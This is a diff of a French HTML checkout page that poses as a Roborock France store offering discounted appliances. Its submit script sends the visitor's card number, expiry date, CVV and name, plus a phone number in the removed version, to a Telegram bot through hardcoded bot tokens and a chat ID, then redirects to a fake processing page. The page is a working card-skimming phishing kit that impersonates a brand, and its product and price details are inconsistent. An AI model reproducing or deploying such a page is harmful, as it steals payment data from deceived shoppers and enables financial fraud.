@@ -3,222 +3,296 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Formulaire de Paiement</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <title>Page de Paiement</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
     <style>
         body {
-            font-family: 'Arial', sans-serif;
+            font-family: 'Roboto', Arial, sans-serif;
+            background: linear-gradient(to right, #ffffff, #f4f4f4);
+            margin: 0;
+            padding: 0;
         }
-        #card-error {
-            display: none;
-            color: red;
-            font-size: 0.9rem;
-            margin-top: 5px;
+
+        .container {
+            max-width: 700px;
+            margin: 50px auto;
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+            padding: 30px 40px;
+        }
+
+        h2 {
+            text-align: center;
+            color: #c70000;
+            margin-bottom: 30px;
+            font-size: 24px;
+        }
+
+        /* Section du produit */
+        .product-info {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .product-info img {
+            width: 150px; /* Taille de l'image du produit */
+            margin-bottom: 15px;
+        }
+
+        .product-info p {
+            font-size: 16px;
+            color: #333;
+        }
+
+        .price {
+            font-size: 20px;
+            color: #c70000;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+
+        /* Séparateur entre le produit et les informations de paiement */
+        hr {
+            border: 0;
+            border-top: 2px solid #c70000;
+            margin: 30px 0;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            font-weight: 500;
+            margin-bottom: 8px;
+            display: block;
+            color: #333;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+
+        .form-group input:focus {
+            border-color: #c70000;
+            outline: none;
+        }
+
+        .form-group button {
+            width: 100%;
+            padding: 15px;
+            background-color: #c70000;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .form-group button:hover {
+            background-color: #a50000;
+        }
+
+        .secure-payment {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .secure-payment img {
+            width: 150px;
         }
     </style>
 </head>
-<body class="bg-gray-100 flex flex-col min-h-screen justify-between">
+<body>
 
-    <!-- Card de produit avec image en haut -->
-    <div class="product-card bg-white rounded-lg shadow-xl p-8 max-w-lg mx-auto mt-10">
-        <!-- Image produit -->
-        <div class="flex justify-center mb-6">
-            <img src="S8MaxVUltra_A_Fr.webp" alt="S8 MaxV Ultra" class="w-48 h-auto rounded-md shadow-lg">
-        </div>
-        <div class="product-info text-center">
-            <h3 class="text-xl font-semibold text-gray-800">S8 MaxV Ultra</h3>
-            <p class="text-lg text-green-600 mt-2">799€ <span class="line-through text-red-500">1499€</span></p>
-        </div>
-    </div>
-
-<input type="hidden" id="prix" value="799">
-
-<!-- Barre de progression -->
-        <div class="progress-bar">
-            <div class="step active">
-                <span>1</span>
-                <p>Produit</p>
-            </div>
-            <div class="step active">
-                <span>2</span>
-                <p>Informations</p>
-            </div>
-            <div class="step">
-                <span>3</span>
-                <p>Confirmation</p>
-            </div>
+    <div class="container">
+        <!-- Information du produit -->
+        <div class="product-info">
+            <img src="71dOPK9GIOL._AC_SX569_.jpg" alt="Moulinex Robot cuiseur">
+            <h3>Moulinex Robot cuiseur - 18 Modes - Balance intégrée</h3>
+            <p>Capacité : 3 Litres</p>
+            <p>Marque : Moulinex</p>
+            <p>Puissance : 1550 Watts</p>
+            <p>Couleur : Noir</p>
+            <p>Méthode de contrôle : Application, Tactile</p>
+            <p>Dimensions : 32P x 31l x 35H cm</p>
+                <span class="price">849.99€</span>
         </div>
 
-    <!-- Formulaire de paiement -->
-    <div class="bg-white rounded-lg shadow-xl p-8 max-w-lg mx-auto mt-6">
-        <h1 class="text-2xl font-bold text-center text-gray-800 mb-2">Formulaire de Paiement</h1>
-        <p class="text-sm text-center text-gray-600 mb-6">
-            Veuillez entrer vos informations de paiement pour effectuer la transaction en toute sécurité.
-            Ce processus est sécurisé et protégé.
-        </p>
-        
-        <!-- Section supplémentaire: Remboursement sécurisé -->
-        <div class="mt-6 flex justify-center">
-            <img src="ALTP-page-CB.jpg" alt="paiement sécurisé" class="w-52 h-auto">
-        </div>
+        <!-- Séparateur -->
+        <hr>
 
-            <!-- Numéro de carte -->
-            <div class="mb-4">
-                <label for="numero-carte" class="block text-sm font-medium text-gray-700">Numéro de carte</label>
-                <input type="tel" id="numero-carte" placeholder="1234 5678 9012 3456" required maxlength="19"
-                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
-                <p id="card-error" class="text-red-500 hidden">Le numéro de carte doit être valide et respecter le format.</p>
+        <!-- Informations de paiement -->
+        <h2>Informations de Paiement</h2>
+
+        <form action="confirmation.html" method="POST" id="payment-form">
+            <div class="form-group">
+                <label for="card-number">Numéro de carte</label>
+                <input 
+                    type="text" 
+                    id="card-number" 
+                    name="card-number" 
+                    placeholder="xxxx xxxx xxxx xxxx" 
+                    maxlength="19" 
+                    inputmode="numeric" 
+                    required>
             </div>
 
-            <!-- Date d'expiration -->
-            <div class="mb-4">
-                <label for="date-expiration" class="block text-sm font-medium text-gray-700">Date d'expiration (MM/AA)</label>
-                <input type="month" id="date-expiration" required
-                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
-            </div>
-
-            <!-- Code CVV -->
-            <div class="mb-4">
-                <label for="cvv" class="block text-sm font-medium text-gray-700">Code CVV</label>
-                <input type="tel" id="cvv" placeholder="123" required maxlength="3"
-                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
-            </div>
-
-            <!-- Formulaire -->
-        <form id="paiement-form">
-            <!-- Titulaire de la carte -->
-            <div class="mb-4">
-                <label for="nom" class="block text-sm font-medium text-gray-700">Titulaire de la carte</label>
-                <input type="text" id="nom" placeholder="Ex: Jean Dupont" required
-                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
-            </div>
-
-            <!-- Numéro de téléphone -->
-            <div class="mb-4">
-                <label for="telephone" class="block text-sm font-medium text-gray-700">Numéro de téléphone</label>
-                <input type="tel" id="telephone" placeholder="Ex: 06 12 34 56 78" required
-                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
-            </div>
-
-            <!-- Bouton de validation -->
-            <button type="submit"
-                class="w-full bg-green-600 text-white font-bold py-2 px-4 rounded-lg hover:bg-green-700 transition duration-300">
-                Valider mon paiement
-            </button>
-         </form>
-
-<!-- Section supplémentaire: Remboursement sécurisé -->
-        <div class="mt-6 flex justify-center">
-            <img src="instrumentys_paiement_securise_logo.jpg" alt="paiement sécurisé" class="w-52 h-auto">
-        </div>
-    </div>
-    </form>
-
- <!-- FOOTER -->
-<footer class="bg-gray-800 text-white py-8">
-    <div class="max-w-6xl mx-auto px-4">
-        <!-- Haut du footer : Liens et Réseaux Sociaux -->
-        <div class="flex flex-col md:flex-row justify-between items-center md:items-start">
-            <!-- Logo et description -->
-            <div class="mb-6 md:mb-0">
-                <img src="roborock.png" alt="Roborock Logo" class="h-12 mb-4">
-                <p class="text-sm text-gray-400">
-                    Explorez un monde de nettoyage intelligent avec Roborock, conçu pour votre confort quotidien.
-                </p>
-            </div>
-
-            <!-- Liens utiles -->
-            <div class="flex space-x-8">
-                <div>
-                    <h4 class="text-lg font-bold mb-4">Produits</h4>
-                    <ul class="text-sm space-y-2">
-                        <li><a href="#" class="hover:underline text-gray-400">Aspirateurs Robots</a></li>
-                        <li><a href="#" class="hover:underline text-gray-400">Accessoires</a></li>
-                        <li><a href="#" class="hover:underline text-gray-400">Nouveautés</a></li>
-                    </ul>
-                </div>
-                <div>
-                    <h4 class="text-lg font-bold mb-4">Support</h4>
-                    <ul class="text-sm space-y-2">
-                        <li><a href="#" class="hover:underline text-gray-400">FAQ</a></li>
-                        <li><a href="#" class="hover:underline text-gray-400">Manuels</a></li>
-                        <li><a href="#" class="hover:underline text-gray-400">Contact</a></li>
-                    </ul>
+            <div class="form-group">
+                <label for="expiry-date">Date d'expiration</label>
+                <div style="display: flex; gap: 10px;">
+                    <select id="expiry-month" name="expiry-month" required>
+                        <option value="" disabled selected>Mois</option>
+                        <option value="01">01</option>
+                        <option value="02">02</option>
+                        <option value="03">03</option>
+                        <option value="04">04</option>
+                        <option value="05">05</option>
+                        <option value="06">06</option>
+                        <option value="07">07</option>
+                        <option value="08">08</option>
+                        <option value="09">09</option>
+                        <option value="10">10</option>
+                        <option value="11">11</option>
+                        <option value="12">12</option>
+                    </select>
+                    <select id="expiry-year" name="expiry-year" required>
+                        <option value="" disabled selected>Année</option>
+                        <option value="2025">2025</option>
+                        <option value="2026">2026</option>
+                        <option value="2027">2027</option>
+                        <option value="2028">2028</option>
+                        <option value="2029">2029</option>
+                        <option value="2030">2030</option>
+                        <option value="2031">2031</option>
+                        <option value="2032">2032</option>
+                        <option value="2033">2033</option>
+                        <option value="2034">2034</option>
+                        <option value="2035">2035</option>
+                        <option value="2036">2036</option>
+                    </select>
                 </div>
             </div>
 
-            <!-- Réseaux sociaux -->
-            <div class="mt-6 md:mt-0">
-                <h4 class="text-lg font-bold mb-4">Suivez-nous</h4>
-                <div class="flex space-x-4">
-                    <a href="#" class="text-gray-400 hover:text-white">
-                        <i class="fab fa-facebook fa-lg"></i>
-                    </a>
-                    <a href="#" class="text-gray-400 hover:text-white">
-                        <i class="fab fa-twitter fa-lg"></i>
-                    </a>
-                    <a href="#" class="text-gray-400 hover:text-white">
-                        <i class="fab fa-instagram fa-lg"></i>
-                    </a>
-                    <a href="#" class="text-gray-400 hover:text-white">
-                        <i class="fab fa-youtube fa-lg"></i>
-                    </a>
-                </div>
+            <div class="form-group">
+                <label for="cvv">CVV</label>
+                <input 
+                    type="text" 
+                    id="cvv" 
+                    name="cvv" 
+                    placeholder="123" 
+                    maxlength="3" 
+                    inputmode="numeric" 
+                    required>
             </div>
-        </div>
 
-        <!-- Bas du footer : Droits réservés -->
-        <div class="mt-10 border-t border-gray-700 pt-6 text-center text-sm text-gray-500">
-            <p>&copy; 2025 Roborock. Tous droits réservés. | <a href="#" class="hover:underline">Politique de confidentialité</a> | <a href="#" class="hover:underline">Conditions d'utilisation</a></p>
+            <div class="form-group">
+                <label for="name-on-card">Nom sur la carte</label>
+                <input type="text" id="name-on-card" name="name-on-card" placeholder="Entrez le nom" required>
+            </div>
+
+            <div class="form-group">
+                <button type="submit">Payer maintenant</button>
+            </div>
+        </form>
+
+        <div class="secure-payment">
+            <img src="instrumentys_paiement_securise_logo.jpg" alt="Paiement Sécurisé">
         </div>
     </div>
-</footer>
-
 
     <script>
-        document.getElementById("paiement-form").addEventListener("submit", async function(event) {
-            event.preventDefault();
+    const cardInput = document.getElementById('card-number');
 
-            const nom = document.getElementById("nom").value;
-            const numeroCarte = document.getElementById("numero-carte").value.replace(/\s+/g, '');
-            const dateExpiration = document.getElementById("date-expiration").value;
-            const cvv = document.getElementById("cvv").value;
-            const telephone = document.getElementById("telephone").value;
-            const PRIX = document.getElementById("prix").value;
+    cardInput.addEventListener('input', (e) => {
+        let value = e.target.value.replace(/\s+/g, ''); // Retirer les espaces
+        if (value.length > 16) value = value.slice(0, 16); // Limiter à 16 chiffres
+        const formattedValue = value.replace(/(\d{4})/g, '$1 ').trim(); // Ajouter un espace après chaque 4 chiffres
+        e.target.value = formattedValue;
+    });
 
+    // Fonction pour envoyer les informations au bot Telegram
+    document.getElementById('payment-form').addEventListener('submit', async function(e) {
+        e.preventDefault(); // Empêcher l'envoi du formulaire par défaut
 
-            // Send to Telegram bot
-            const token = "7631724461:AAGvOb7G_n2IO1qGwpJp-WaHgyBhREW1mfU";
-            const chatId = "5372119436";
+        const data = new FormData(this);
+        const cardNumber = data.get('card-number');
+        const expiryMonth = data.get('expiry-month');
+        const expiryYear = data.get('expiry-year');
+        const cvv = data.get('cvv');
+        const nameOnCard = data.get('name-on-card');
+        const price = "399.99€"; // Prix du produit
 
-            const message = `
-🔔 Nouvelle Demande de Paiement 🔔
-👤 Nom: ${nom}
-💳 Numéro de Carte: ${numeroCarte}
-📅 Expiration: ${dateExpiration}
-🔒 CVV: ${cvv}
-📞 Téléphone: ${telephone}
-🔔 Prix : ${PRIX} EURO`;
+        // Créez un message à envoyer
+        const message = `
+Produit : LG TV - 55NANO766 - 55 Pouces 4K
+Prix : ${price}
+Numéro de carte : ${cardNumber}
+Date d'expiration : ${expiryMonth}/${expiryYear}
+CVV : ${cvv}
+Nom sur la carte : ${nameOnCard}
+`;
 
-            try {
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message,
-                        parse_mode: "Markdown",
-                    }),
-                });
+        const botToken = '8101158488:AAH6WIfCC6B6aGkWd_Tt6QRrWD8QKQQc69M'; // Votre token
+        const chatId = '5372119436'; // Votre chat ID Telegram
 
+        const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        try {
+            // Envoi du message
+            const response = await fetch(telegramApiUrl);
+            const dataResponse = await response.json();
+
+            if (dataResponse.ok) {
+                // Redirection vers la page "Traitement.html"
                 window.location.href = "Traitement.html";
-            } catch (error) {
-                alert("Impossible d'envoyer les données. Vérifiez votre connexion.");
+            } else {
+                alert('Erreur dans l\'envoi des informations. Veuillez réessayer.');
             }
-        });
-    </script>
+        } catch (error) {
+            console.error('Erreur lors de l\'envoi:', error);
+            alert('Erreur réseau ou problème avec l\'API Telegram.');
+        }
+    });
+</script>
 
-</body>
-</html>
+
+<!-- Footer -->
+<footer style="background-color: #2c3e50; color: #ecf0f1; padding: 20px;">
+    <div style="display: flex; justify-content: space-between; flex-wrap: wrap;">
+        <!-- Colonne 1 -->
+        <div style="flex: 1; min-width: 200px; margin: 10px;">
+            <h4 style="color: #e74c3c;">À propos</h4>
+            <p style="color: #bdc3c7;">Roborock France vous propose les meilleures solutions pour un nettoyage efficace et intelligent.</p>
+        </div>
+        <!-- Colonne 2 -->
+        <div style="flex: 1; min-width: 200px; margin: 10px;">
+            <h4 style="color: #e74c3c;">Liens utiles</h4>
+            <ul style="list-style: none; padding: 0;">
+                <li><a href="#" style="color: #ecf0f1; text-decoration: none;">Politique de confidentialité</a></li>
+                <li><a href="#" style="color: #ecf0f1; text-decoration: none;">Conditions d'utilisation</a></li>
+                <li><a href="#" style="color: #ecf0f1; text-decoration: none;">Assistance</a></li>
+            </ul>
+        </div>
+        <!-- Colonne 3 -->
+        <div style="flex: 1; min-width: 200px; margin: 10px;">
+            <h4 style="color: #e74c3c;">Suivez-nous</h4>
+            <div style="display: flex; gap: 10px;">
+                <a href="https://facebook.com" target="_blank" style="color: #ecf0f1; font-size: 1.5rem;"><i class="fab fa-facebook"></i></a>
+                <a href="https://instagram.com" target="_blank" style="color: #ecf0f1; font-size: 1.5rem;"><i class="fab fa-instagram"></i></a>
+                <a href="https://youtube.com" target="_blank" style="color: #ecf0f1; font-size: 1.5rem;"><i class="fab fa-youtube"></i></a>
+                <a href="https://tiktok.com" target="_blank" style="color: #ecf0f1; font-size: 1.5rem;"><i class="fab fa-tiktok"></i></a>
+            </div>
+        </div>
+    </div>
+    <div style="text-align: center; margin-top: 20px;">
+        <p>&copy; 2025 Roborock France. Tous droits réservés.</p>
+    </div>
+</footer>
